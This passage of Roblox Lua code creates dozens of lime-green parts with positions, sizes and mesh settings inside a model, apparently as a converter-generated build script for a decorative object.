p8.CFrame = CFrame.new(23.6530304, 23.6272488, 27.0660381, -0.573576212, 0.346187651, -0.742403805, -1.19791855e-006, -0.90630722, -0.422617733, -0.819152236, -0.24240458, 0.519836128)
p8.CanCollide = false
p8.FormFactor = Enum.FormFactor.Custom
p8.Size = Vector3.new(0.849326968, 0.849327147, 0.584051371)
p8.BottomSurface = Enum.SurfaceType.Smooth
p8.TopSurface = Enum.SurfaceType.Smooth
b8 = Instance.new("SpecialMesh", p8)
b8.MeshId = "http://www.roblox.com/asset/?id=3270017"
b8.TextureId = ""
b8.MeshType = Enum.MeshType.FileMesh
b8.Name = "Mesh"
b8.Scale = Vector3.new(0.849326968, 0.849327147, 0.56621933)
p9 = Instance.new("Part", m2)
p9.BrickColor = BrickColor.new("Lime green")
p9.Material = Enum.Material.SmoothPlastic
p9.Reflectance = 0.30000001192093
p9.CFrame = CFrame.new(30.2536392, 23.691061, 26.9184284, -0.573576212, -0.346188962, 0.74240309, 4.47034836e-007, -0.906307578, -0.422616601, 0.81915164, -0.242404819, 0.519836843)
p9.CanCollide = false
p9.FormFactor = Enum.FormFactor.Custom
p9.Size = Vector3.new(0.585091829, 0.622839987, 0.584051371)
p9.BottomSurface = Enum.SurfaceType.Smooth
p9.TopSurface = Enum.SurfaceType.Smooth
b9 = Instance.new("SpecialMesh", p9)
b9.MeshId = "http://www.roblox.com/asset/?id=3270017"
b9.TextureId = ""
b9.MeshType = Enum.MeshType.FileMesh
b9.Name = "Mesh"
b9.Scale = Vector3.new(0.585091829, 0.622839928, 0.301983595)
p10 = Instance.new("Part", m2)
p10.BrickColor = BrickColor.new("Lime green")
p10.Material = Enum.Material.SmoothPlastic
p10.Reflectance = 0.30000001192093
p10.CFrame = CFrame.new(27.9471893, 26.8180733, 25.3034286, -0.573576212, 0.469845235, 0.671010077, 2.86794574e-007, -0.819150567, 0.573576927, 0.81915164, 0.328989446, 0.469847172)
p10.CanCollide = false
p10.FormFactor = Enum.FormFactor.Custom
p10.Size = Vector3.new(0.849326968, 0.849327147, 0.584051371)
p10.BottomSurface = Enum.SurfaceType.Smooth
p10.TopSurface = Enum.SurfaceType.Smooth
b10 = Instance.new("SpecialMesh", p10)
b10.MeshId = "http://www.roblox.com/asset/?id=3270017"
b10.TextureId = ""
b10.MeshType = Enum.MeshType.FileMesh
b10.Name = "Mesh"
b10.Scale = Vector3.new(0.849326968, 0.849327147, 0.56621933)
p11 = Instance.new("Part", m2)
p11.BrickColor = BrickColor.new("Lime green")
p11.Material = Enum.Material.SmoothPlastic
p11.Reflectance = 0.30000001192093
p11.CFrame = CFrame.new(27.8153667, 25.7751122, 25.211132, -0.573576212, 0.469845206, 0.671010017, 3.03888498e-007, -0.819150567, 0.573576987, 0.81915164, 0.328989416, 0.469847172)
p11.CanCollide = false
p11.FormFactor = Enum.FormFactor.Custom
p11.Size = Vector3.new(0.584050655, 0.584051132, 0.584051371)
p11.BottomSurface = Enum.SurfaceType.Smooth
p11.TopSurface = Enum.SurfaceType.Smooth
b11 = Instance.new("SpecialMesh", p11)
b11.MeshId = "http://www.roblox.com/asset/?id=3270017"
b11.TextureId = ""
b11.MeshType = Enum.MeshType.FileMesh
b11.Name = "Mesh"
b11.Scale = Vector3.new(0.283109009, 0.283109039, 0.283109665)
p12 = Instance.new("Part", m2)
p12.BrickColor = BrickColor.new("Lime green")
p12.Material = Enum.Material.SmoothPlastic
p12.Reflectance = 0.30000001192093
p12.CFrame = CFrame.new(29.655653, 24.6090927, 26.4997177, -0.573576212, 0.212011248, 0.791239619, 2.79475898e-007, -0.965924561, 0.258820325, 0.81915164, 0.14845185, 0.554032922)
p12.CanCollide = false
p12.FormFactor = Enum.FormFactor.Custom
p12.Size = Vector3.new(0.584050655, 0.584051132, 0.584051371)
p12.BottomSurface = Enum.SurfaceType.Smooth
p12.TopSurface = Enum.SurfaceType.Smooth
b12 = Instance.new("SpecialMesh", p12)
b12.MeshId = "http://www.roblox.com/asset/?id=3270017"
b12.TextureId = ""
b12.MeshType = Enum.MeshType.FileMesh
b12.Name = "Mesh"
b12.Scale = Vector3.new(0.283109009, 0.283109039, 0.283109665)
p13 = Instance.new("Part", m2)
p13.BrickColor = BrickColor.new("Lime green")
p13.Material = Enum.Material.SmoothPlastic
p13.Reflectance = 0.30000001192093
p13.CFrame = CFrame.new(27.9198303, 25.8644161, 25.2842865, -0.573576212, 0.469845116, 0.671010017, 2.51205847e-007, -0.819150507, 0.573577106, 0.81915164, 0.328989446, 0.469847202)
p13.CanCollide = false
p13.FormFactor = Enum.FormFactor.Custom
p13.Size = Vector3.new(0.585091829, 0.622839987, 0.584051371)
p13.BottomSurface = Enum.SurfaceType.Smooth
p13.TopSurface = Enum.SurfaceType.Smooth
b13 = Instance.new("SpecialMesh", p13)
b13.MeshId = "http://www.roblox.com/asset/?id=3270017"
b13.TextureId = ""
b13.MeshType = Enum.MeshType.FileMesh
b13.Name = "Mesh"
b13.Scale = Vector3.new(0.585091829, 0.622839928, 0.301983595)
p14 = Instance.new("Part", m2)
p14.BrickColor = BrickColor.new("Lime green")
p14.Material = Enum.Material.SmoothPlastic
p14.Reflectance = 0.30000001192093
p14.CFrame = CFrame.new(29.778841, 24.6493893, 26.5859776, -0.573576212, 0.212011158, 0.791239619, 2.26793262e-007, -0.965924621, 0.258820474, 0.81915164, 0.148451865, 0.554032922)
p14.CanCollide = false
p14.FormFactor = Enum.FormFactor.Custom
p14.Size = Vector3.new(0.585091829, 0.622839987, 0.584051371)
p14.BottomSurface = Enum.SurfaceType.Smooth
p14.TopSurface = Enum.SurfaceType.Smooth
b14 = Instance.new("SpecialMesh", p14)
b14.MeshId = "http://www.roblox.com/asset/?id=3270017"
b14.TextureId = ""
b14.MeshType = Enum.MeshType.FileMesh
b14.Name = "Mesh"
b14.Scale = Vector3.new(0.585091829, 0.622839928, 0.301983595)
p15 = Instance.new("Part", m2)
p15.BrickColor = BrickColor.new("Lime green")
p15.Material = Enum.Material.SmoothPlastic
p15.Reflectance = 0.30000001192093
p15.CFrame = CFrame.new(29.3303242, 25.7026424, 26.271925, -0.573576212, 0.280165315, 0.769750893, 1.98523225e-007, -0.939691305, 0.342021316, 0.81915164, 0.196174055, 0.538986266)
p15.CanCollide = false
p15.FormFactor = Enum.FormFactor.Custom
p15.Size = Vector3.new(0.584050655, 0.584051132, 0.584051371)
p15.BottomSurface = Enum.SurfaceType.Smooth
p15.TopSurface = Enum.SurfaceType.Smooth
b15 = Instance.new("SpecialMesh", p15)
b15.MeshId = "http://www.roblox.com/asset/?id=3270017"
b15.TextureId = ""
b15.MeshType = Enum.MeshType.FileMesh
b15.Name = "Mesh"
b15.Scale = Vector3.new(0.283109009, 0.283109039, 0.283109665)
p16 = Instance.new("Part", m2)
p16.BrickColor = BrickColor.new("Lime green")
p16.Material = Enum.Material.SmoothPlastic
p16.Reflectance = 0.30000001192093
p16.CFrame = CFrame.new(29.8983212, 24.6884689, 26.6696377, -0.573576272, 0.212011099, 0.791239798, 1.39939146e-007, -0.965924501, 0.258820534, 0.81915158, 0.148451924, 0.554033041)
p16.CanCollide = false
p16.FormFactor = Enum.FormFactor.Custom
p16.Size = Vector3.new(0.849326968, 0.849327147, 0.584051371)
p16.BottomSurface = Enum.SurfaceType.Smooth
p16.TopSurface = Enum.SurfaceType.Smooth
b16 = Instance.new("SpecialMesh", p16)
b16.MeshId = "http://www.roblox.com/asset/?id=3270017"
b16.TextureId = ""
b16.MeshType = Enum.MeshType.FileMesh
b16.Name = "Mesh"
b16.Scale = Vector3.new(0.849326968, 0.849327147, 0.56621933)
p17 = Instance.new("Part", m2)
p17.BrickColor = BrickColor.new("Lime green")
p17.Material = Enum.Material.SmoothPlastic
p17.Reflectance = 0.30000001192093
p17.CFrame = CFrame.new(29.5664043, 25.8075294, 26.4372196, -0.573576272, 0.280165255, 0.769751072, 1.1166911e-007, -0.939691126, 0.342021376, 0.81915158, 0.196174115, 0.538986385)
p17.CanCollide = false
p17.FormFactor = Enum.FormFactor.Custom
p17.Size = Vector3.new(0.849326968, 0.849327147, 0.584051371)
p17.BottomSurface = Enum.SurfaceType.Smooth
p17.TopSurface = Enum.SurfaceType.Smooth
b17 = Instance.new("SpecialMesh", p17)
b17.MeshId = "http://www.roblox.com/asset/?id=3270017"
b17.TextureId = ""
b17.MeshType = Enum.MeshType.FileMesh
b17.Name = "Mesh"
b17.Scale = Vector3.new(0.849326968, 0.849327147, 0.56621933)
p18 = Instance.new("Part", m2)
p18.BrickColor = BrickColor.new("Lime green")
p18.Material = Enum.Material.SmoothPlastic
p18.Reflectance = 0.30000001192093
p18.CFrame = CFrame.new(28.021162, 25.9510212, 25.3552322, -0.573576331, 0.469845086, 0.671010435, 8.10900147e-008, -0.819150269, 0.573577285, 0.819151521, 0.328989595, 0.469847381)
p18.CanCollide = false
p18.FormFactor = Enum.FormFactor.Custom
p18.Size = Vector3.new(0.849326968, 0.849327147, 0.584051371)
p18.BottomSurface = Enum.SurfaceType.Smooth
p18.TopSurface = Enum.SurfaceType.Smooth
b18 = Instance.new("SpecialMesh", p18)
b18.MeshId = "http://www.roblox.com/asset/?id=3270017"
b18.TextureId = ""
b18.MeshType = Enum.MeshType.FileMesh
b18.Name = "Mesh"
b18.Scale = Vector3.new(0.849326968, 0.849327147, 0.56621933)
p19 = Instance.new("Part", m2)
p19.BrickColor = BrickColor.new("Lime green")
p19.Material = Enum.Material.SmoothPlastic
p19.Reflectance = 0.30000001192093
p19.CFrame = CFrame.new(30.3657436, 23.6272507, 26.9969234, -0.573576272, -0.346189439, 0.74240303, -9.24166343e-009, -0.906307697, -0.422616035, 0.819151521, -0.242404714, 0.519837141)
p19.CanCollide = false
p19.FormFactor = Enum.FormFactor.Custom
p19.Size = Vector3.new(0.849326968, 0.849327147, 0.584051371)
p19.BottomSurface = Enum.SurfaceType.Smooth
p19.TopSurface = Enum.SurfaceType.Smooth
b19 = Instance.new("SpecialMesh", p19)
b19.MeshId = "http://www.roblox.com/asset/?id=3270017"
b19.TextureId = ""
b19.MeshType = Enum.MeshType.FileMesh
b19.Name = "Mesh"
b19.Scale = Vector3.new(0.849326968, 0.849327147, 0.56621933)
p20 = Instance.new("Part", m2)
p20.BrickColor = BrickColor.new("Lime green")
p20.Material = Enum.Material.SmoothPlastic
p20.Reflectance = 0.30000001192093
p20.CFrame = CFrame.new(30.2536469, 23.6910553, 26.9184265, -0.573576272, -0.346189529, 0.742402911, -2.63107069e-007, -0.906307518, -0.422615975, 0.819151521, -0.242404476, 0.519837141)
p20.CanCollide = false
p20.FormFactor = Enum.FormFactor.Custom
p20.Size = Vector3.new(0.585091829, 0.622839987, 0.584051371)
p20.BottomSurface = Enum.SurfaceType.Smooth
p20.TopSurface = Enum.SurfaceType.Smooth
b20 = Instance.new("SpecialMesh", p20)
b20.MeshId = "http://www.roblox.com/asset/?id=3270017"
b20.TextureId = ""
b20.MeshType = Enum.MeshType.FileMesh
b20.Name = "Mesh"
b20.Scale = Vector3.new(0.585091829, 0.622839928, 0.301983595)
p21 = Instance.new("Part", m2)
p21.BrickColor = BrickColor.new("Lime green")
p21.Material = Enum.Material.SmoothPlastic
p21.Reflectance = 0.30000001192093
p21.CFrame = CFrame.new(27.8458843, 26.7314644, 25.2324886, -0.573576272, 0.469844759, 0.671010494, -4.23347274e-007, -0.819149971, 0.573577166, 0.819151521, 0.328989863, 0.469847023)
p21.CanCollide = false
p21.FormFactor = Enum.FormFactor.Custom
p21.Size = Vector3.new(0.585091829, 0.622839987, 0.584051371)
p21.BottomSurface = Enum.SurfaceType.Smooth
p21.TopSurface = Enum.SurfaceType.Smooth
b21 = Instance.new("SpecialMesh", p21)
b21.MeshId = "http://www.roblox.com/asset/?id=3270017"
b21.TextureId = ""
b21.MeshType = Enum.MeshType.FileMesh
b21.Name = "Mesh"
b21.Scale = Vector3.new(0.585091829, 0.622839928, 0.301983595)
p22 = Instance.new("Part", m2)
p22.BrickColor = BrickColor.new("Lime green")
p22.Material = Enum.Material.SmoothPlastic
p22.Reflectance = 0.30000001192093
p22.CFrame = CFrame.new(30.1380615, 23.756855, 26.8374882, -0.573576212, -0.346189648, 0.742402732, -5.1367897e-007, -0.906307459, -0.422615856, 0.819151521, -0.242404282, 0.519837141)
p22.CanCollide = false
p22.FormFactor = Enum.FormFactor.Custom
p22.Size = Vector3.new(0.584050655, 0.584051132, 0.584051371)
p22.BottomSurface = Enum.SurfaceType.Smooth
p22.TopSurface = Enum.SurfaceType.Smooth
b22 = Instance.new("SpecialMesh", p22)
b22.MeshId = "http://www.roblox.com/asset/?id=3270017"
b22.TextureId = ""
b22.MeshType = Enum.MeshType.FileMesh
b22.Name = "Mesh"
b22.Scale = Vector3.new(0.283109009, 0.283109039, 0.283109665)
p23 = Instance.new("Part", m2)
p23.BrickColor = BrickColor.new("Lime green")
p23.Material = Enum.Material.SmoothPlastic
p23.Reflectance = 0.30000001192093
p23.CFrame = CFrame.new(29.4501858, 25.7558784, 26.3558216, -0.573576212, 0.280164778, 0.769751191, -6.73919146e-007, -0.939690709, 0.342021406, 0.819151521, 0.196174636, 0.538986027)
p23.CanCollide = false
p23.FormFactor = Enum.FormFactor.Custom
p23.Size = Vector3.new(0.585091829, 0.622839987, 0.584051371)
p23.BottomSurface = Enum.SurfaceType.Smooth
p23.TopSurface = Enum.SurfaceType.Smooth
b23 = Instance.new("SpecialMesh", p23)
b23.MeshId = "http://www.roblox.com/asset/?id=3270017"
b23.TextureId = ""
b23.MeshType = Enum.MeshType.FileMesh
b23.Name = "Mesh"
b23.Scale = Vector3.new(0.585091829, 0.622839928, 0.301983595)
p24 = Instance.new("Part", m2)
p24.BrickColor = BrickColor.new("Lime green")
p24.Material = Enum.Material.SmoothPlastic
p24.Reflectance = 0.30000001192093
p24.CFrame = CFrame.new(29.3303471, 25.702631, 26.2719078, -0.573576272, 0.280164808, 0.76975143, -7.04498234e-007, -0.939690709, 0.342021465, 0.819151461, 0.196174651, 0.538986087)
p24.CanCollide = false
p24.FormFactor = Enum.FormFactor.Custom
p24.Size = Vector3.new(0.584050655, 0.584051132, 0.584051371)
p24.BottomSurface = Enum.SurfaceType.Smooth
p24.TopSurface = Enum.SurfaceType.Smooth
b24 = Instance.new("SpecialMesh", p24)
b24.MeshId = "http://www.roblox.com/asset/?id=3270017"
b24.TextureId = ""
b24.MeshType = Enum.MeshType.FileMesh
b24.Name = "Mesh"
b24.Scale = Vector3.new(0.283109009, 0.283109039, 0.283109665)
p25 = Instance.new("Part", m2)
p25.BrickColor = BrickColor.new("Lime green")
p25.Material = Enum.Material.SmoothPlastic
p25.Reflectance = 0.30000001192093
p25.CFrame = CFrame.new(29.7788715, 24.6493816, 26.5859661, -0.573576331, 0.212010548, 0.791240335, -7.63082312e-007, -0.965923905, 0.258820742, 0.819151402, 0.14845252, 0.554032862)
p25.CanCollide = false
p25.FormFactor = Enum.FormFactor.Custom
p25.Size = Vector3.new(0.585091829, 0.622839987, 0.584051371)
p25.BottomSurface = Enum.SurfaceType.Smooth
p25.TopSurface = Enum.SurfaceType.Smooth
b25 = Instance.new("SpecialMesh", p25)
b25.MeshId = "http://www.roblox.com/asset/?id=3270017"
b25.TextureId = ""
b25.MeshType = Enum.MeshType.FileMesh
b25.Name = "Mesh"
b25.Scale = Vector3.new(0.585091829, 0.622839928, 0.301983595)
p26 = Instance.new("Part", m2)
p26.BrickColor = BrickColor.new("Lime green")
p26.Material = Enum.Material.SmoothPlastic
p26.Reflectance = 0.30000001192093
p26.CFrame = CFrame.new(29.450201, 25.7558823, 26.3558235, -0.573576331, 0.280164748, 0.769751668, -7.91352306e-007, -0.93969059, 0.342021525, 0.819151402, 0.196174681, 0.538986146)
p26.CanCollide = false
p26.FormFactor = Enum.FormFactor.Custom
p26.Size = Vector3.new(0.585091829, 0.622839987, 0.584051371)
p26.BottomSurface = Enum.SurfaceType.Smooth
p26.TopSurface = Enum.SurfaceType.Smooth
b26 = Instance.new("SpecialMesh", p26)
b26.MeshId = "http://www.roblox.com/asset/?id=3270017"
b26.TextureId = ""
b26.MeshType = Enum.MeshType.FileMesh
b26.Name = "Mesh"
b26.Scale = Vector3.new(0.585091829, 0.622839928, 0.301983595)
p27 = Instance.new("Part", m2)
p27.BrickColor = BrickColor.new("Lime green")
p27.Material = Enum.Material.SmoothPlastic
p27.Reflectance = 0.30000001192093
p27.CFrame = CFrame.new(30.3657703, 23.6272449, 26.9969063, -0.57357645, -0.346190155, 0.74240309, -9.161393e-007, -0.90630734, -0.422615707, 0.819151342, -0.242404088, 0.51983732)
p27.CanCollide = false
p27.FormFactor = Enum.FormFactor.Custom
p27.Size = Vector3.new(0.849326968, 0.849327147, 0.584051371)
p27.BottomSurface = Enum.SurfaceType.Smooth
p27.TopSurface = Enum.SurfaceType.Smooth
b27 = Instance.new("SpecialMesh", p27)
b27.MeshId = "http://www.roblox.com/asset/?id=3270017"
b27.TextureId = ""
b27.MeshType = Enum.MeshType.FileMesh
b27.Name = "Mesh"
b27.Scale = Vector3.new(0.849326968, 0.849327147, 0.56621933)
p28 = Instance.new("Part", m2)
p28.BrickColor = BrickColor.new("Lime green")
p28.Material = Enum.Material.SmoothPlastic
p28.Reflectance = 0.30000001192093
p28.CFrame = CFrame.new(28.0211868, 25.9510098, 25.3552094, -0.57357645, 0.469844639, 0.67101109, -1.07637948e-006, -0.819149673, 0.573577106, 0.819151342, 0.328990191, 0.469846785)
p28.CanCollide = false
p28.FormFactor = Enum.FormFactor.Custom
p28.Size = Vector3.new(0.849326968, 0.849327147, 0.584051371)
p28.BottomSurface = Enum.SurfaceType.Smooth
p28.TopSurface = Enum.SurfaceType.Smooth
b28 = Instance.new("SpecialMesh", p28)
b28.MeshId = "http://www.roblox.com/asset/?id=3270017"
b28.TextureId = ""
b28.MeshType = Enum.MeshType.FileMesh
b28.Name = "Mesh"
b28.Scale = Vector3.new(0.849326968, 0.849327147, 0.56621933)
p29 = Instance.new("Part", m2)
p29.BrickColor = BrickColor.new("Lime green")
p29.Material = Enum.Material.Neon
p29.CFrame = CFrame.new(31.2683067, 23.2277946, 27.6474876, 0.280168235, -0.769749522, -0.573576212, 0.939691305, 0.342017233, -1.0690095e-006, 0.19617486, -0.538985491, 0.819151521)
p29.FormFactor = Enum.FormFactor.Custom
p29.Size = Vector3.new(0.61060679, 3.09150696, 0.221234918)
p29.BottomSurface = Enum.SurfaceType.Smooth
p29.TopSurface = Enum.SurfaceType.Smooth
b29 = Instance.new("SpecialMesh", p29)
b29.MeshType = Enum.MeshType.Sphere
b29.Name = "Mesh"
p30 = Instance.new("Part", m2)
p30.BrickColor = BrickColor.new("Lime green")
p30.Material = Enum.Material.SmoothPlastic
p30.Reflectance = 0.30000001192093
p30.CFrame = CFrame.new(29.655632, 24.6090698, 26.4996777, -0.573576212, 0.2120094, 0.791238904, -1.13902195e-006, -0.965922236, 0.258820891, 0.819151521, 0.148452237, 0.554032147)
p30.CanCollide = false
p30.FormFactor = Enum.FormFactor.Custom
p30.Size = Vector3.new(0.584050655, 0.584051132, 0.584051371)
p30.BottomSurface = Enum.SurfaceType.Smooth
p30.TopSurface = Enum.SurfaceType.Smooth
b30 = Instance.new("SpecialMesh", p30)
b30.MeshId = "http://www.roblox.com/asset/?id=3270017"
b30.TextureId = ""
b30.MeshType = Enum.MeshType.FileMesh
b30.Name = "Mesh"
b30.Scale = Vector3.new(0.283109009, 0.283109039, 0.283109665)
p31 = Instance.new("Part", m2)
p31.BrickColor = BrickColor.new("Lime green")
p31.Material = Enum.Material.SmoothPlastic
p31.Reflectance = 0.30000001192093
p31.CFrame = CFrame.new(30.138031, 23.7568359, 26.8374538, -0.573576212, -0.346189976, 0.742401063, -1.26856219e-006, -0.906306148, -0.422614396, 0.819151521, -0.242403775, 0.519836485)
p31.CanCollide = false
p31.FormFactor = Enum.FormFactor.Custom
p31.Size = Vector3.new(0.584050655, 0.584051132, 0.584051371)
p31.BottomSurface = Enum.SurfaceType.Smooth
p31.TopSurface = Enum.SurfaceType.Smooth
b31 = Instance.new("SpecialMesh", p31)
b31.MeshId = "http://www.roblox.com/asset/?id=3270017"
b31.TextureId = ""
b31.MeshType = Enum.MeshType.FileMesh
b31.Name = "Mesh"
b31.Scale = Vector3.new(0.283109009, 0.283109039, 0.283109665)
p32 = Instance.new("Part", m2)
p32.BrickColor = BrickColor.new("Lime green")
p32.Material = Enum.Material.SmoothPlastic
p32.Reflectance = 0.30000001192093
p32.CFrame = CFrame.new(27.741394, 26.6421375, 25.1592979, -0.573576212, 0.469842911, 0.671009958, -1.42880219e-006, -0.819147944, 0.573576748, 0.819151521, 0.328989625, 0.4698461)
p32.CanCollide = false
p32.FormFactor = Enum.FormFactor.Custom
p32.Size = Vector3.new(0.584050655, 0.584051132, 0.584051371)
p32.BottomSurface = Enum.SurfaceType.Smooth
p32.TopSurface = Enum.SurfaceType.Smooth
b32 = Instance.new("SpecialMesh", p32)
b32.MeshId = "http://www.roblox.com/asset/?id=3270017"
b32.TextureId = ""
b32.MeshType = Enum.MeshType.FileMesh
b32.Name = "Mesh"
b32.Scale = Vector3.new(0.283109009, 0.283109039, 0.283109665)
p33 = Instance.new("Part", m2)
p33.BrickColor = BrickColor.new("Lime green")
p33.Material = Enum.Material.Neon
p33.CFrame = CFrame.new(32.7100258, 25.2490444, 28.6569691, -0.14224124, -0.806705832, -0.573576093, 0.984804153, -0.173650295, -1.38238238e-006, -0.0996002704, -0.564861953, 0.819151759)
p33.FormFactor = Enum.FormFactor.Custom
p33.Size = Vector3.new(0.61060679, 7.32508755, 0.221234918)
p33.BottomSurface = Enum.SurfaceType.Smooth
p33.TopSurface = Enum.SurfaceType.Smooth
b33 = Instance.new("SpecialMesh", p33)
b33.MeshType = Enum.MeshType.Sphere
b33.Name = "Mesh"
p34 = Instance.new("Part", m2)
p34.BrickColor = BrickColor.new("Lime green")
p34.Material = Enum.Material.SmoothPlastic
p34.Reflectance = 0.30000001192093
p34.CFrame = CFrame.new(27.919817, 25.8643856, 25.2842369, -0.573576391, 0.469842792, 0.671009898, -1.37759764e-006, -0.819147885, 0.573576868, 0.8191517, 0.328989476, 0.46984604)
p34.CanCollide = false
p34.FormFactor = Enum.FormFactor.Custom
p34.Size = Vector3.new(0.585091829, 0.622839987, 0.584051371)
p34.BottomSurface = Enum.SurfaceType.Smooth
p34.TopSurface = Enum.SurfaceType.Smooth
b34 = Instance.new("SpecialMesh", p34)
b34.MeshId = "http://www.roblox.com/asset/?id=3270017"
b34.TextureId = ""
b34.MeshType = Enum.MeshType.FileMesh
b34.Name = "Mesh"
b34.Scale = Vector3.new(0.585091829, 0.622839928, 0.301983595)
p35 = Instance.new("Part", m2)
p35.BrickColor = BrickColor.new("Lime green")
p35.Material = Enum.Material.SmoothPlastic
p35.Reflectance = 0.30000001192093
p35.CFrame = CFrame.new(29.8982925, 24.6884441, 26.6695824, -0.573576391, 0.212008998, 0.791238666, -1.40201018e-006, -0.965921998, 0.25882113, 0.8191517, 0.148452297, 0.554031909)
p35.CanCollide = false
p35.FormFactor = Enum.FormFactor.Custom
p35.Size = Vector3.new(0.849326968, 0.849327147, 0.584051371)
p35.BottomSurface = Enum.SurfaceType.Smooth
p35.TopSurface = Enum.SurfaceType.Smooth
b35 = Instance.new("SpecialMesh", p35)
b35.MeshId = "http://www.roblox.com/asset/?id=3270017"
b35.TextureId = ""
b35.MeshType = Enum.MeshType.FileMesh
b35.Name = "Mesh"
b35.Scale = Vector3.new(0.849326968, 0.849327147, 0.56621933)
p36 = Instance.new("Part", m2)
p36.BrickColor = BrickColor.new("Lime green")
p36.Material = Enum.Material.SmoothPlastic
p36.Reflectance = 0.30000001192093
p36.CFrame = CFrame.new(27.8153496, 25.7750854, 25.2110863, -0.573576391, 0.469842672, 0.671009898, -1.43028012e-006, -0.819147885, 0.573576927, 0.8191517, 0.328989506, 0.4698461)
p36.CanCollide = false
p36.FormFactor = Enum.FormFactor.Custom
p36.Size = Vector3.new(0.584050655, 0.584051132, 0.584051371)
p36.BottomSurface = Enum.SurfaceType.Smooth
p36.TopSurface = Enum.SurfaceType.Smooth
b36 = Instance.new("SpecialMesh", p36)
b36.MeshId = "http://www.roblox.com/asset/?id=3270017"
b36.TextureId = ""
b36.MeshType = Enum.MeshType.FileMesh
b36.Name = "Mesh"
b36.Scale = Vector3.new(0.283109009, 0.283109039, 0.283109665)
p37 = Instance.new("Part", m2)
p37.BrickColor = BrickColor.new("Lime green")
p37.Material = Enum.Material.Neon
p37.CFrame = CFrame.new(30.7430439, 27.8460693, 27.2796841, -0.409572512, -0.709406137, -0.573576272, 0.866021335, -0.500000834, -1.38386031e-006, -0.286787719, -0.49673146, 0.819151938)
p37.FormFactor = Enum.FormFactor.Custom
p37.Size = Vector3.new(0.61060679, 7.32508755, 0.221234918)
p37.BottomSurface = Enum.SurfaceType.Smooth
p37.TopSurface = Enum.SurfaceType.Smooth
b37 = Instance.new("SpecialMesh", p37)
b37.MeshType = Enum.MeshType.Sphere
b37.Name = "Mesh"
p38 = Instance.new("Part", m2)
p38.BrickColor = BrickColor.new("Lime green")
p38.Material = Enum.Material.Neon
p38.CFrame = CFrame.new(32.7113533, 27.1965656, 28.6579113, -0.28016308, -0.769750178, -0.573576272, 0.939688683, -0.342021704, -1.3540581e-006, -0.196174175, -0.538985133, 0.819152057)
p38.FormFactor = Enum.FormFactor.Custom
p38.Size = Vector3.new(0.61060679, 8.03632927, 0.221234918)
p38.BottomSurface = Enum.SurfaceType.Smooth
p38.TopSurface = Enum.SurfaceType.Smooth
b38 = Instance.new("SpecialMesh", p38)
b38.MeshType = Enum.MeshType.Sphere
b38.Name = "Mesh"
p39 = Instance.new("Part", m2)
p39.BrickColor = BrickColor.new("Lime green")
p39.Material = Enum.Material.SmoothPlastic
p39.Reflectance = 0.30000001192093
p39.CFrame = CFrame.new(26.2033787, 25.7750854, 25.2801971, -0.573574483, -0.469848186, -0.671007693, -2.18929154e-006, -0.819150686, 0.573572934, -0.819151402, 0.328989863, 0.469846785)
p39.CanCollide = false
p39.FormFactor = Enum.FormFactor.Custom
p39.Size = Vector3.new(0.584050655, 0.584051132, 0.584051371)
p39.BottomSurface = Enum.SurfaceType.Smooth
p39.TopSurface = Enum.SurfaceType.Smooth
b39 = Instance.new("SpecialMesh", p39)
b39.MeshId = "http://www.roblox.com/asset/?id=3270017"
b39.TextureId = ""
b39.MeshType = Enum.MeshType.FileMesh
b39.Name = "Mesh"
b39.Scale = Vector3.new(0.283109009, 0.283109039, 0.283109665)
p40 = Instance.new("Part", m2)
p40.BrickColor = BrickColor.new("Lime green")
p40.Material = Enum.Material.SmoothPlastic
p40.Reflectance = 0.30000001192093
p40.CFrame = CFrame.new(25.9975967, 25.9509888, 25.4242878, -0.573574483, -0.469848186, -0.671007693, -2.18929154e-006, -0.819150686, 0.573572934, -0.819151402, 0.328989863, 0.469846785)
p40.CanCollide = false
p40.FormFactor = Enum.FormFactor.Custom
p40.Size = Vector3.new(0.849326968, 0.849327147, 0.584051371)
p40.BottomSurface = Enum.SurfaceType.Smooth
p40.TopSurface = Enum.SurfaceType.Smooth
b40 = Instance.new("SpecialMesh", p40)
b40.MeshId = "http://www.roblox.com/asset/?id=3270017"
b40.TextureId = ""
b40.MeshType = Enum.MeshType.FileMesh
b40.Name = "Mesh"
b40.Scale = Vector3.new(0.849326968, 0.849327147, 0.56621933)
p41 = Instance.new("Part", m2)
p41.BrickColor = BrickColor.new("Lime green")
p41.Material = Enum.Material.SmoothPlastic
p41.Reflectance = 0.30000001192093
p41.CFrame = CFrame.new(26.098917, 25.8643856, 25.3533516, -0.573574483, -0.469848186, -0.671007693, -2.18929154e-006, -0.819150686, 0.573572934, -0.819151402, 0.328989863, 0.469846785)
p41.CanCollide = false
p41.FormFactor = Enum.FormFactor.Custom
p41.Size = Vector3.new(0.585091829, 0.622839987, 0.584051371)
p41.BottomSurface = Enum.SurfaceType.Smooth
p41.TopSurface = Enum.SurfaceType.Smooth
b41 = Instance.new("SpecialMesh", p41)
b41.MeshId = "http://www.roblox.com/asset/?id=3270017"
b41.TextureId = ""
b41.MeshType = Enum.MeshType.FileMesh
b41.Name = "Mesh"
b41.Scale = Vector3.new(0.585091829, 0.622839928, 0.301983595)
p42 = Instance.new("Part", m2)
p42.BrickColor = BrickColor.new("Lime green")
p42.Material = Enum.Material.SmoothPlastic
p42.Reflectance = 0.30000001192093
p42.CFrame = CFrame.new(24.12043, 24.6884346, 26.7387066, -0.573574483, -0.212014884, -0.791238487, -2.23079792e-006, -0.965923309, 0.258816421, -0.819151402, 0.148452327, 0.554032683)
p42.CanCollide = false
p42.FormFactor = Enum.FormFactor.Custom
p42.Size = Vector3.new(0.849326968, 0.849327147, 0.584051371)
p42.BottomSurface = Enum.SurfaceType.Smooth
p42.TopSurface = Enum.SurfaceType.Smooth
b42 = Instance.new("SpecialMesh", p42)
b42.MeshId = "http://www.roblox.com/asset/?id=3270017"
b42.TextureId = ""
b42.MeshType = Enum.MeshType.FileMesh
b42.Name = "Mesh"
b42.Scale = Vector3.new(0.849326968, 0.849327147, 0.56621933)
p43 = Instance.new("Part", m2)
p43.BrickColor = BrickColor.new("Lime green")
p43.Material = Enum.Material.SmoothPlastic
p43.Reflectance = 0.30000001192093
p43.CFrame = CFrame.new(24.12043, 24.6884365, 26.7387066, -0.573574483, -0.212014899, -0.791238487, -2.30996147e-006, -0.96592325, 0.258816421, -0.819151402, 0.148452222, 0.554032683)
p43.CanCollide = false
p43.FormFactor = Enum.FormFactor.Custom
p43.Size = Vector3.new(0.849326968, 0.849327147, 0.584051371)
p43.BottomSurface = Enum.SurfaceType.Smooth
p43.TopSurface = Enum.SurfaceType.Smooth
